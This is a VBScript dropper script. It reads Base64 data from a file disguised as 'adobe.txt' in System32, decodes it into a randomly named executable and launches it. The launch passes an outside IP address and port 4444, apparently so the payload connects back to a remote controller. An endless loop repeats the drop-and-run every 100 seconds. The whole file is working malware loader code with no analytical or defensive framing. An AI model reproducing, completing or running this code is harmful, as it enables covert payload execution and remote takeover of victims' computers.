Option Explicit

Dim a, inFile, fso, ts, b64, bytes, outFile, curDir, loopCount

a = "C:\Windows\System32\adobe.txt"

' Check file path
inFile = a
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FileExists(inFile) Then
  WScript.Echo "Error: File not found: " & inFile
  WScript.Quit 1
End If

' Set current directory
curDir = fso.GetAbsolutePathName(".")

' Read Base64 data
Set ts = fso.OpenTextFile(inFile, 1, False) ' ForReading
b64 = ts.ReadAll
ts.Close

' Clean Base64 data (removing unnecessary characters)
b64 = Replace(b64, vbCr, "")
b64 = Replace(b64, vbLf, "")
b64 = Replace(b64, vbTab, "")
b64 = Replace(b64, " ", "")

' Decode the Base64 data
bytes = DecodeBase64(b64)
If IsEmpty(bytes) Then
  WScript.Echo "Error: Failed to decode Base64 data."
  WScript.Quit 1
End If

' Write .exe file
loopCount = 0
do  
  outFile = fso.BuildPath(curDir, RandomName(12) & ".exe")
  WriteBytes outFile, bytes
  
  Dim sh
  Set sh = CreateObject("WScript.Shell")
  sh.Run """" & outFile & """ 88.183.58.29 4444", 1, False
  WScript.Sleep 100000

Loop

' Functions remain unchanged
Private Function DecodeBase64(ByVal s)
  Dim xm, el
  Set xm = CreateObject("Microsoft.XMLDOM")
  Set el = xm.createElement("x")
  el.DataType = "bin.base64"
  el.Text = s
  DecodeBase64 = el.NodeTypedValue
End Function

Private Sub WriteBytes(ByVal path, ByVal b)
  Dim st
  Set st = CreateObject("ADODB.Stream")
  st.Type = 1 ' binaire
  st.Open
  st.Write b
  st.SaveToFile path, 2
  st.Close
End Sub

Private Function RandomName(ByVal n)
  Dim chars, i
  chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
  Randomize
  For i = 1 To n
    RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
  Next
End Function

